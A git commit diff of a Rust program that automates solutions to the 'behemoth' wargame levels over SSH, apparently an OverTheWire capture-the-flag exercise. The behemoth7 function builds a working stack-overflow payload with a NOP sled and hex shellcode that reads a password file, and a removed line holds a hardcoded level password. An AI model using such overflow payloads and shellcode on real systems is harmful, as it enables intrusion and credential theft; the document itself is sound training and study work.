628011a640283338bc00c12dc1189f081e143af4
Christopher <chris@grislygrotto.nz>
2024-02-07 18:54:11 +1300

    finished all of behemoth

--- src/main.rs
+++ src/main.rs
@@ -8,15 +8,19 @@ const PORT: usize = 2221;
 
 fn main() -> Result<()> {
 
-    //let pass_1 = behemoth0("behemoth0")?;
-    //let pass_2 = behemoth1(&pass_1)?;
-    //let pass_3 = behemoth2(&pass_2)?;
-    //let pass_4 = behemoth3(&pass_3)?;
-    //let pass_5 = behemoth4(&pass_4)?;
-    //let pass_6 = behemoth5(&pass_5)?;
-    let _pass_7 = behemoth6("cBucvF0OhB"); //(&pass_6)?;
-    // let pass_8 = behemoth7(&pass_7)?;
-    // behemoth8(&pass_8)?;
+    println!("LETS DO BEHEMOTH SHALL WE...\n");
+
+    let pass_1 = behemoth0("behemoth0")?;
+    let pass_2 = behemoth1(&pass_1)?;
+    let pass_3 = behemoth2(&pass_2)?;
+    let pass_4 = behemoth3(&pass_3)?;
+    let pass_5 = behemoth4(&pass_4)?;
+    let pass_6 = behemoth5(&pass_5)?;
+    let pass_7 = behemoth6(&pass_6)?;
+    let pass_8 = behemoth7(&pass_7)?;
+    behemoth8(&pass_8)?;
+
+    println!("\nALL DONE!!!!");
 
     Ok(())
 }
@@ -238,7 +242,6 @@ fn behemoth3(password: &str) -> Result<String> {
     full_payload.extend(file_to_read);
 
     let encoded = hex_literal(&full_payload);
-    println!("{encoded}");
 
     let session = ssh_session("behemoth3", password)?;
     let mut channel = session.channel_session()?;
@@ -375,10 +378,13 @@ fn behemoth6(password: &str) -> Result<String> {
     let result = result.split(['\r','\n']).map(|s| s.trim()).find(|s| s.len() == 10).unwrap();
     println!("retrieved behemoth7 pass '{result}'\n");
 
-    Ok("result".to_string())
+    Ok(result.to_string())
 }
 
 fn behemoth7(password: &str) -> Result<String> {
+    // behemoth7 was like behemoth1 (at least, my solution was very similar)
+    // differences were the length was 528 to the ret address, and nothing in that buffer could be non-alphanumeric
+    // the ret address itself and the stack after it could be whatever though, so just moved things about a bit
     
     let session = ssh_session("behemoth7", password)?;
     let mut channel = session.channel_session()?;
@@ -386,10 +392,37 @@ fn behemoth7(password: &str) -> Result<String> {
 
     read_until(&mut channel, "$ ")?;
 
-    Ok("result".to_string())
+    let prefix: Vec<u8> = vec![0x41; 528];
+    let var_adr = hex::decode("a0d2ffff")?; // 0xffffd35c, approximate location in nop sled
+    let nop_sled: Vec<u8> = vec![0x90; 64];
+    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
+    let file_to_read = "/etc/behemoth_pass/behemoth8".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
+
+    let mut full_payload: Vec<u8> = Vec::new();
+    full_payload.extend(prefix);
+    full_payload.extend(var_adr);
+    full_payload.extend(nop_sled);
+    full_payload.extend(file_read_shellcode);
+    full_payload.extend(file_to_read);
+
+    let encoded = hex_literal(&full_payload);
+
+    let target = "/behemoth/behemoth7";
+    println!("running '{target} $(echo -en [payload])'");
+
+    let cmd = format!("{target} $(echo -en \"{encoded}\")");
+    write_line(&mut channel, &cmd)?;
+    
+    println!("reading result");
+    let result = read_until(&mut channel, "$ ")?;
+    let result = result.split(['\r','\n']).map(|s| s.trim()).find(|s| s.len() == 10).unwrap();
+    println!("retrieved behemoth2 pass '{result}'\n");
+
+    Ok(result.to_string())
 }
 
-fn behemoth8(password: &str) -> Result<String> {
+fn behemoth8(password: &str) -> Result<()> {
+    // final level, no challenge here :)
     
     let session = ssh_session("behemoth8", password)?;
     let mut channel = session.channel_session()?;
@@ -397,5 +430,10 @@ fn behemoth8(password: &str) -> Result<String> {
 
     read_until(&mut channel, "$ ")?;
 
-    Ok("result".to_string())
+    println!("reading final message:");
+    write_line(&mut channel, "cat CONGRATULATIONS")?;
+    let result = read_until(&mut channel, "$ ")?;
+    println!("{result}");
+
+    Ok(())
 }
